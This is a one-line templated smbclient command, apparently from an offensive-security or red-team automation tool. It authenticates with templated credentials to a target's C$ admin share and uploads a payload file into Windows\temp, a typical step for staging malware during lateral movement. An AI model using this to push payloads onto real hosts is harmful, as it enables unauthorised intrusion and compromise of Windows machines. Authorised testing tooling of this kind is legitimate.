smbclient -A {{#secretFile}}username = {{ username }}
password = {{ password }}
{{/secretFile}} //{{sh ipv4address.addr}}/C$/ -c 'put "{{ payloadDirectory }}{{ payloadFileName }}" "Windows\temp\{{ payloadFileName }}"'
